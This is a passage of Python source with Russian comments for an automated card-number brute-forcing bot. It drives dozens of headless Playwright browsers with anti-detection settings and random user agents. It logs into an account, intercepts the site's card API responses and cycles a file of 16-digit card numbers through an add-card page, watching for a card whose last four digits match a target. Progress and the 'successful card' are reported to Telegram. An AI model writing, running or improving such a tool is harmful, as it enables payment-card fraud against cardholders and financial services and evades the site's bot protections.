                if 'cards' in data_obj and isinstance(data_obj['cards'], list):
                    # data.cards - список, преобразуем в структуру с items
                    cards_data = {
                        'data': {
                            'cards': {
                                'items': data_obj['cards']
                            }
                        }
                    }
                    logger.info(f"✅ cards_data: data.cards преобразован из списка в items")
            
            # ✅ ЕСЛИ ЭТО СПИСОК - ПРЕОБРАЗУЕМ В ПРАВИЛЬНУЮ СТРУКТУРУ
            if isinstance(cards_data, list):
                logger.info(f"🔄 cards_data это список, преобразую в структуру API")
                if cards_data and isinstance(cards_data[0], dict):
                    cards_data = {
                        'data': {
                            'cards': {
                                'items': cards_data
                            }
                        }
                    }
                    logger.info(f"✅ Преобразовано в словарь с {len(cards_data['data']['cards']['items'])} картами")
                else:
                    logger.error(f"❌ cards_data список, но элементы не словари: {type(cards_data[0]) if cards_data else 'empty'}")
                    return False
            
            # ✅ ПРОВЕРЯЕМ ТИП И СТРУКТУРУ
            if cards_data and isinstance(cards_data, dict):
                # Проверяем, что есть правильная структура
                if 'data' in cards_data and 'cards' in cards_data.get('data', {}):
                    async with initial_cards_lock:
                        initial_cards_data = cards_data
                        log_initial_data_state("init_monitor_data_single after set")
                    
                    items = cards_data.get('data', {}).get('cards', {}).get('items', [])
                    # Убеждаемся, что items - это список
                    if not isinstance(items, list):
                        logger.warning(f"⚠️ items не список: {type(items)}, преобразую в список")
                        items = []
                    
                    cards_with_suffix = [c for c in items if isinstance(c, dict) and c.get('number', '').endswith(suffix)]
                    
                    logger.info(f"✅ Использую данные из авторизации: {len(items)} карт, из них с суффиксом {suffix}: {len(cards_with_suffix)}")
                    
                    # Сохраняем данные для первого монитора
                    if monitor_initial_data:
                        monitor_initial_data[0]['initial_count'] = len(cards_with_suffix)
                        if cards_with_suffix:
                            monitor_initial_data[0]['initial_id'] = cards_with_suffix[0].get('id')
                            monitor_initial_data[0]['initial_sn'] = cards_with_suffix[0].get('sn')
                            card_id = cards_with_suffix[0].get('id', '')
                            logger.info(f"✅ Первая карта с суффиксом: ID={card_id[:8] if card_id else 'None'}..., SN={cards_with_suffix[0].get('sn')}")
                        else:
                            logger.warning(f"⚠️ Карты с суффиксом {suffix} не найдены в данных авторизации")
                    
                    return True
                else:
                    logger.warning(f"⚠️ Данные из авторизации имеют неправильную структуру: {list(cards_data.keys()) if isinstance(cards_data, dict) else 'not a dict'}")
                    # Пробуем восстановить структуру если есть ключ 'cards'
                    if isinstance(cards_data, dict) and 'cards' in cards_data:
                        logger.info(f"🔄 Пробую восстановить структуру из cards_data...")
                        fixed_data = {
                            'data': {
                                'cards': cards_data
                            }
                        }
                        if 'items' in cards_data:
                            items = cards_data.get('items', [])
                            logger.info(f"✅ Восстановлено: {len(items)} карт")
                            async with initial_cards_lock:
                                initial_cards_data = fixed_data
                                log_initial_data_state("init_monitor_data_single after fix")
                            if monitor_initial_data:
                                monitor_initial_data[0]['initial_count'] = len(items)
                            return True
            else:
                logger.warning(f"⚠️ Данные из авторизации не словарь: {type(cards_data)}")
    
    # Если данные из авторизации не подходят - получаем заново
    logger.warning("⚠️ Нет данных из авторизации или они некорректны, получаю заново...")
    page = monitor_pages[0]
    
    # Пробуем через fetch
    data = await get_cards_list_via_fetch(page)
    if not data:
        logger.warning("⚠️ Fetch не сработал, пробую через перезагрузку...")
        data = await get_cards_list(page)
    
    if not data:
        logger.error("❌ Не удалось получить список карт")
        return False
    
    if not isinstance(data, dict):
        logger.error(f"❌ Полученные данные не словарь: {type(data)}")
        return False
    
    # ✅ ПРОВЕРЯЕМ СТРУКТУРУ
    if 'data' not in data or 'cards' not in data.get('data', {}):
        logger.error(f"❌ Полученные данные имеют неправильную структуру: {list(data.keys()) if isinstance(data, dict) else 'not a dict'}")
        if 'cards' in data:
            logger.info("🔄 Пробую восстановить структуру...")
            data = {
                'data': {
                    'cards': data.get('cards', {})
                }
            }
        else:
            return False
    
    async with initial_cards_lock:
        initial_cards_data = data
        log_initial_data_state("init_monitor_data_single after fetch")
    
    items = data.get('data', {}).get('cards', {}).get('items', [])
    if not isinstance(items, list):
        logger.error(f"❌ items не список: {type(items)}")
        return False
    
    cards_with_suffix = [c for c in items if isinstance(c, dict) and c.get('number', '').endswith(suffix)]
    
    logger.info(f"✅ Получен начальный список через перезагрузку: {len(items)} карт, из них с суффиксом {suffix}: {len(cards_with_suffix)}")
    
    async with monitor_data_lock:
        if monitor_initial_data:
            monitor_initial_data[0]['initial_count'] = len(cards_with_suffix)
            if cards_with_suffix:
                monitor_initial_data[0]['initial_id'] = cards_with_suffix[0].get('id')
                monitor_initial_data[0]['initial_sn'] = cards_with_suffix[0].get('sn')
                card_id = cards_with_suffix[0].get('id', '')
                logger.info(f"✅ Первая карта с суффиксом: ID={card_id[:8] if card_id else 'None'}..., SN={cards_with_suffix[0].get('sn')}")
            else:
                logger.warning(f"⚠️ Карты с суффиксом {suffix} не найдены в полученном списке")
    
    return True

# ═══════════════════════════════════════════════════════════════
#  АВТОРИЗАЦИЯ МОНИТОРА
# ═══════════════════════════════════════════════════════════════
async def monitor_auth(phone, password, chat_id):
    global monitor_contexts, monitor_pages, monitor_expire_time
    global monitor_uuids, monitor_initial_data
    
    profile_dir = os.path.join(PROFILES_DIR, 'monitor')
    os.makedirs(profile_dir, exist_ok=True)
    logger.info(f"🔐 Авторизация монитора (тел: {phone})...")

    for ctx in monitor_contexts:
        try:
            await ctx.close()
        except:
            pass
    monitor_contexts.clear()
    monitor_pages.clear()
    monitor_uuids.clear()
    monitor_initial_data.clear()

    async def auth_one_monitor(i):
        logger.info(f"🔐 Авторизация монитора {i+1}/8...")
        ctx = await p.chromium.launch_persistent_context(
            user_data_dir=f'{profile_dir}_{i}',
            headless=True,
            viewport={'width':1920,'height':1080},
            user_agent=random.choice(USER_AGENTS),
            locale='ru-RU', timezone_id='Europe/Moscow',
            args=ANTIDETECT_ARGS
        )
        page = await ctx.new_page()
        await apply_antidetect(page)
        
        captured_uuid = None
        captured_sn_map = {}
        captured_cards_data = None
        
        async def intercept_cards_response(response):
            nonlocal captured_uuid, captured_sn_map, captured_cards_data
            url = response.url
            if '/api/cards/' in url and response.status == 200:
                try:
                    body = await response.body()
                    text = body.decode('utf-8', errors='ignore')
                    data = json.loads(text)
                    
                    if isinstance(data, dict):
                        captured_cards_data = data
                        logger.debug(f"✅ Монитор {i+1}: сохранены данные карт (тип: dict)")
                    else:
                        logger.warning(f"⚠️ Монитор {i+1}: данные не словарь: {type(data)}")
                        captured_cards_data = None
                    
                    match = re.search(r'/api/cards/([a-f0-9]+)\?', url)
                    if match:
                        captured_uuid = match.group(1)
                        logger.debug(f"✅ Монитор {i+1}: UUID из URL: {captured_uuid}")
                    
                    if 'data' in data and 'cards' in data['data']:
                        cards_dict = data['data']['cards']
                        if isinstance(cards_dict, dict) and 'items' in cards_dict:
                            for card in cards_dict['items']:
                                if isinstance(card, dict):
                                    number = card.get('number', '')
                                    sn = card.get('sn')
                                    if len(number) >= 4:
                                        suffix = number[-4:]
                                        captured_sn_map[suffix] = sn
                    
                    logger.info(f"✅ Монитор {i+1}: найдено {len(captured_sn_map)} карт")
                    
                except Exception as e:
                    logger.error(f"⚠️ Монитор {i+1}: ошибка парсинга /api/cards/: {e}")
        
        page.on('response', intercept_cards_response)
        
        try:
            await page.goto(AUTH_URL, wait_until='domcontentloaded', timeout=60000)
            await asyncio.sleep(3)
            
            if '/personal' in page.url or '/add-card' in page.url:
                logger.debug(f"⚠️ Монитор {i+1}: уже авторизован, очищаю куки")
                await ctx.clear_cookies()
                await page.goto(AUTH_URL, wait_until='domcontentloaded', timeout=60000)
                await asyncio.sleep(3)
            
            await page.wait_for_selector('#login', timeout=40000)
            await page.fill('#login', phone)
            await page.fill('#pass', password)
            await page.evaluate("document.querySelector('#rememberMe').click()")
            
            await page.click('button[type="submit"]:has-text("Войти")')
            logger.debug(f"🔐 Монитор {i+1}: отправлена форма входа")
            
            for j in range(60):
                if '/personal' in page.url or '/add-card' in page.url:
                    logger.debug(f"🔐 Монитор {i+1}: редирект на {page.url} через {j} секунд")
                    break
                await asyncio.sleep(1)
            
            if '/auth' in page.url:
                logger.error(f"❌ Монитор {i+1}: ошибка авторизации")
                await ctx.close()
                return None, None, None, None, None
            
            await asyncio.sleep(3)
            
            if not captured_uuid:
                logger.debug(f"🔄 Монитор {i+1}: перехват не сработал, пробую перезагрузить add-card...")
                await page.goto(ADD_CARD_URL, wait_until='domcontentloaded', timeout=60000)
                await asyncio.sleep(3)
            
            if '/add-card' not in page.url:
                logger.debug(f"🔄 Монитор {i+1}: перехожу на add-card...")
                await page.goto(ADD_CARD_URL, wait_until='domcontentloaded', timeout=60000)
                await asyncio.sleep(3)
            
            cookies = await ctx.cookies()
            with open(f'{profile_dir}_{i}_cookies.json', 'w') as f:
                json.dump(cookies, f, indent=2, ensure_ascii=False)
            
            if captured_uuid and captured_sn_map:
                logger.info(f"✅ Монитор {i+1}: авторизован, UUID={captured_uuid}, карт={len(captured_sn_map)}")
                return ctx, page, captured_uuid, captured_sn_map, captured_cards_data
            else:
                logger.error(f"❌ Монитор {i+1}: не удалось получить UUID/SN")
                await ctx.close()
                return None, None, None, None, None
            
        except Exception as e:
            logger.error(f"❌ Монитор {i+1}: ошибка: {e}")
            await ctx.close()
            return None, None, None, None, None

    for batch_start in range(0, 8, 2):
        batch = []
        for i in range(batch_start, min(batch_start + 2, 8)):
            batch.append(auth_one_monitor(i))
        
        results = await asyncio.gather(*batch)
        
        for idx, result in enumerate(results):
            i = batch_start + idx
            if result and len(result) == 5:
                ctx, page, uuid, sn_map, cards_data = result
                if ctx and page and uuid:
                    monitor_contexts.append(ctx)
                    monitor_pages.append(page)
                    monitor_uuids.append(uuid)
                    monitor_initial_data.append({
                        'suffix': None,
                        'initial_id': None,
                        'initial_sn': None,
                        'initial_count': None,
                        'sn_map': sn_map,
                        'cards_data': cards_data
                    })
                    logger.info(f"✅ Монитор {i+1} готов (UUID: {uuid[:8]}..., карт: {len(sn_map)})")
            else:
                logger.error(f"❌ Монитор {i+1}: не удалось авторизовать")

    if not monitor_contexts:
        logger.error("❌ Не удалось авторизовать ни одного монитора")
        await send_telegram(chat_id, "❌ Не удалось авторизовать монитор")
        return False
    
    monitor_expire_time = time.time() + 3600
    logger.info(f"✅ Монитор авторизован ({len(monitor_contexts)} браузера, 60 минут)")
    await send_telegram(chat_id, f"✅ Монитор авторизован ({len(monitor_contexts)} браузера, 60 минут)")
    return True

async def monitor_close():
    global monitor_contexts, monitor_pages
    logger.info("🔐 Закрываю мониторы...")
    for ctx in monitor_contexts:
        try:
            await ctx.close()
        except:
            pass
    monitor_contexts.clear()
    monitor_pages.clear()
    logger.info("✅ Мониторы закрыты")

# ═══════════════════════════════════════════════════════════════
#  БРУТ-ПРОЦЕСС
# ═══════════════════════════════════════════════════════════════
async def brut_process(cards_file, chat_id):
    global brut_running, stop_requested, final_card, total_processed, total_cards
    global progress_message_id, worker_tasks, cards_queue
    global monitor_success_found, monitor_success_card
    global worker_success_cards, worker_skip_cards, worker_error_cards
    global sent_to_monitor, current_suffix, monitor_initial_data, initial_cards_data
    
    logger.info("=" * 60)
    logger.info(f"🚀 ЗАПУСК БРУТА! Файл: {cards_file}")
    logger.info("=" * 60)
    
    brut_running = True
    stop_requested = False
    final_card = None
    monitor_success_found = False
    monitor_success_card = None
    total_processed = 0
    progress_message_id = None
    
    monitor_success.clear()
    monitor_skip.clear()
    monitor_fail.clear()
    dropped_cards.clear()
    worker_success_cards.clear()
    worker_skip_cards.clear()
    worker_error_cards.clear()
    sent_to_monitor.clear()
    initial_cards_data = None
    
    async with processed_lock:
        processed_cards.clear()
    
    while not check_queue.empty():
        try:
            check_queue.get_nowait()
        except asyncio.QueueEmpty:
            break
    logger.info("🧹 Очередь монитора очищена")

    logger.info(f"🚀 Брут: начинаю обработку файла {cards_file}")

    with open(cards_file, 'r') as f:
        raw = [line.strip().replace(' ', '').replace('-', '') for line in f if line.strip()]

    cards = [c for c in raw if len(c) == 16 and c.isdigit()]
    invalid = len(raw) - len(cards)
    if invalid:
        logger.warning(f"⚠️ Отброшено {invalid} невалидных карт")

    if not cards:
        await send_telegram(chat_id, "❌ В файле нет валидных карт")
        brut_running = False
        return

    total_cards = len(cards)
    logger.info(f"📋 Брут: загружено {total_cards} валидных карт")
    logger.info(f"📋 Первые 5 карт: {cards[:5]}")

    first_card = cards[0]
    current_suffix = first_card[-4:]
    logger.info(f"🔑 Суффикс текущего брута: {current_suffix} (из карты {first_card})")

    if not monitor_contexts or time.time() > monitor_expire_time:
        logger.error(f"❌ Монитор не авторизован или истёк (contexts={len(monitor_contexts)}, expire={monitor_expire_time})")
        await send_telegram(chat_id, "⚠️ Монитор не авторизован или истёк")
        brut_running = False
        return

    logger.info(f"📡 Инициализация данных монитора...")
    init_success = await init_monitor_data_single(current_suffix)
    if not init_success:
        logger.error("❌ Не удалось инициализировать данные монитора")
        await send_telegram(chat_id, "❌ Не удалось инициализировать данные монитора")
        brut_running = False
        return
    
    log_initial_data_state("brut_process after init")

    worker_ids = list(worker_contexts.keys())
    if not worker_ids:
        logger.error("❌ Нет активных воркеров")
        await send_telegram(chat_id, "❌ Нет активных воркеров")
        brut_running = False
        return
    
    logger.info(f"🔧 Активные воркеры: {worker_ids}")

    cards_queue = asyncio.Queue()
    for card in cards:
        await cards_queue.put(card)
    logger.info(f"📦 Очередь карт заполнена ({cards_queue.qsize()} карт)")

    await send_progress(chat_id, f"📊 Прогресс: 0/{total_cards}")

    logger.info("📡 Запускаю монитор...")
    monitor_task = asyncio.create_task(monitor_process(chat_id))
    
    logger.info(f"🔧 Запускаю {len(worker_ids)} воркеров...")
    worker_tasks = []
    for wid in worker_ids:
        page = worker_pages[wid]
        task = asyncio.create_task(worker_process_cards(wid, page, chat_id))
        worker_tasks.append(task)
        logger.debug(f"🔧 Воркер {wid} запущен")

    logger.info("⏳ Ожидаю завершения воркеров...")
    retry_count = 0
    max_retries = 5
    
    while True:
        all_done = all(t.done() for t in worker_tasks)
        
        if monitor_success_found or final_card is not None:
            logger.info(f"🎉 Найден успех, останавливаю воркеров...")
            for t in worker_tasks:
                if not t.done():
                    t.cancel()
            
            if worker_tasks:
                try:
                    await asyncio.gather(*worker_tasks, return_exceptions=True)
                except asyncio.CancelledError:
                    pass
                except Exception as e:
                    logger.error(f"❌ Ошибка при остановке воркеров: {e}")
            break
        
        if all_done and cards_queue.empty():
            logger.info("✅ Все воркеры завершены, очередь пуста")
            break
        
        if all_done and not cards_queue.empty():
            remaining = cards_queue.qsize()
            retry_count += 1
            
            if retry_count > max_retries:
                logger.error(f"❌ Превышено максимальное количество перезапусков ({max_retries}). Осталось {remaining} карт.")
                break
            
            logger.info(f"🔄 Воркеры завершились, но в очереди осталось {remaining} карт. Перезапускаю воркеров (попытка {retry_count}/{max_retries})...")
            
            new_worker_tasks = []
            for wid in worker_ids:
                if wid in worker_pages:
                    page = worker_pages[wid]
                    try:
                        await page.evaluate("1")
                        task = asyncio.create_task(worker_process_cards(wid, page, chat_id))
                        new_worker_tasks.append(task)
                        logger.debug(f"🔧 Воркер {wid} перезапущен")
                    except Exception as e:
                        logger.warning(f"⚠️ Воркер {wid} недоступен, пропускаю: {e}")
            
            if not new_worker_tasks:
                logger.error(f"❌ Нет доступных воркеров для обработки {remaining} оставшихся карт!")
                break
            
            worker_tasks = new_worker_tasks
            continue
        
        await asyncio.sleep(2)

    for t in worker_tasks:
        if not t.done():
            t.cancel()
    
    if worker_tasks:
        try:
            await asyncio.gather(*worker_tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass
    
    logger.info("✅ Все воркеры завершены")
    
    brut_running = False
    logger.info("⏳ Ожидаю завершения монитора...")

    await check_queue.put(None)
    try:
        await monitor_task
        logger.info("✅ Монитор завершен")
    except asyncio.CancelledError:
        logger.info("⏹ Монитор отменен")

    success_card = final_card

    logger.info("=" * 60)
    logger.info("📊 ИТОГОВАЯ СТАТИСТИКА:")
    logger.info(f"📊 Всего карт: {total_cards}")
    logger.info(f"📊 Обработано: {total_processed}")
    logger.info(f"✅ Воркеры успех: {len(worker_success_cards)}")
    if worker_success_cards:
        logger.info(f"✅ Успешные карты (воркеры): {worker_success_cards}")
    logger.info(f"⏭️ Воркеры skip: {len(worker_skip_cards)}")
    logger.info(f"❌ Воркеры ошибки: {len(worker_error_cards)}")
    logger.info(f"📡 Монитор skip: {len(monitor_skip)}")
    logger.info(f"📡 Монитор success: {len(monitor_success)}")
    if monitor_success:
        logger.info(f"✅ Успешные карты (монитор): {monitor_success}")
    logger.info(f"❌ Монитор fail: {len(monitor_fail)}")
    if final_card:
        logger.info(f"🎉 ФИНАЛЬНАЯ УСПЕШНАЯ КАРТА: {final_card}")
    else:
        logger.info("😔 Успех не достигнут")
    logger.info("=" * 60)

    msg = (
        f"🏆 Итог:\n"
        f"📊 Всего карт: {total_cards}\n"
        f"✅ Воркеры успех: {len(worker_success_cards)}\n"
        f"⏭️ Воркеры skip: {len(worker_skip_cards)}\n"
        f"📡 Монитор skip: {len(monitor_skip)}\n"
        f"📡 Монитор success: {len(monitor_success)}\n"
        f"❌ Монитор fail: {len(monitor_fail)}"
    )
    if success_card:
        msg += f"\n🎉 УСПЕХ! Карта найдена монитором: {success_card}"
    else:
        msg += "\n😔 Успех не достигнут"

    await send_telegram(chat_id, msg)

    if final_card:
        logger.info("🔐 Закрываю мониторы...")
        await monitor_close()

# ═══════════════════════════════════════════════════════════════
#  СЛУЖЕБНЫЕ ЦИКЛЫ
# ═══════════════════════════════════════════════════════════════
async def keep_alive_loop():
    while True:
        await asyncio.sleep(15*60)
        logger.info(f"🔄 Keep-alive: проверяю воркеров...")
        for wid, page in list(worker_pages.items()):
            try:
                ready_state = await page.evaluate("document.readyState")
                if ready_state != 'complete':
                    logger.debug(f"⏳ Воркер {wid} ещё загружается, пропускаю")
                    continue
                
                current_url = page.url
                if '/auth' in current_url:
                    logger.warning(f"⚠️ Keep-alive: воркер {wid} не авторизован")
                    continue
                
                if ADD_CARD_URL in current_url:
                    await page.evaluate("1")
                    logger.debug(f"✅ Keep-alive: воркер {wid} жив")
                else:
                    logger.debug(f"🔄 Keep-alive: возвращаю воркера {wid} на add-card")
                    await page.goto(ADD_CARD_URL, wait_until='domcontentloaded', timeout=30000)
                    await asyncio.sleep(2)
            except Exception as e:
                logger.warning(f"⚠️ Keep-alive: ошибка воркера {wid}: {e}")
                try:
                    if wid in worker_pages:
                        await worker_pages[wid].goto(ADD_CARD_URL, wait_until='domcontentloaded', timeout=30000)
                except:
                    pass

async def check_tasks():
    global brut_running, stop_requested
    while True:
        if os.path.exists(MONITOR_TASK_FILE):
            try:
                with open(MONITOR_TASK_FILE) as f:
                    task = json.load(f)
                os.remove(MONITOR_TASK_FILE)
                logger.info(f"📥 Задание на авторизацию монитора: {task}")
                await monitor_auth(task['phone'], task['password'], task['chat_id'])
            except Exception as e:
                logger.error(f"❌ Ошибка задания монитора: {e}")
        if os.path.exists(BRUT_TASK_FILE) and not brut_running:
            try:
                with open(BRUT_TASK_FILE) as f:
                    task = json.load(f)
                os.remove(BRUT_TASK_FILE)
                logger.info(f"📥 Задание на брут: {task}")
                asyncio.create_task(brut_process(task['cards_file'], task['chat_id']))
            except Exception as e:
                logger.error(f"❌ Ошибка задания брута: {e}")
        if os.path.exists(STOP_FLAG_FILE):
            os.remove(STOP_FLAG_FILE)
            stop_requested = True
            brut_running = False
            logger.info(f"⏹ Команда остановки")
            await monitor_close()
            await send_telegram(get_last_chat_id() or '', "⏹ Остановлено")
        await asyncio.sleep(2)

async def main():
    global worker_contexts, worker_pages, p
    logger.info("🚀 Worker Manager запущен")

    profile_ids = []
    for wid in range(1, 41):
        profile_dir = os.path.join(PROFILES_DIR, f'worker{wid}')
        if os.path.exists(profile_dir):
            profile_ids.append(wid)

    logger.info(f"📊 Найдено профилей воркеров: {len(profile_ids)}")
    
    for i in range(0, len(profile_ids), 5):
        batch = profile_ids[i:i+5]
        logger.info(f"🔧 Загрузка партии воркеров: {batch}")
        tasks = []
        for wid in batch:
            tasks.append(asyncio.create_task(create_worker_context(wid)))
        results = await asyncio.gather(*tasks)
        for wid, (ctx, page) in zip(batch, results):
            if ctx:
                worker_contexts[wid] = ctx
                worker_pages[wid] = page
                logger.info(f"✅ Воркер {wid} загружен")

    logger.info(f"📊 Всего воркеров загружено: {len(worker_contexts)}")
    logger.info("📡 Запускаю keep-alive и check_tasks...")
    asyncio.create_task(keep_alive_loop())
    asyncio.create_task(check_tasks())
    
    logger.info("✅ Worker Manager готов к работе")
    while True:
        await asyncio.sleep(3600)

if __name__ == '__main__':
    async def run():
        global p, telegram_client
        telegram_client = httpx.AsyncClient(timeout=10.0)
        try:
            async with async_playwright() as p:
                await main()
        finally:
            await telegram_client.aclose()
    asyncio.run(run())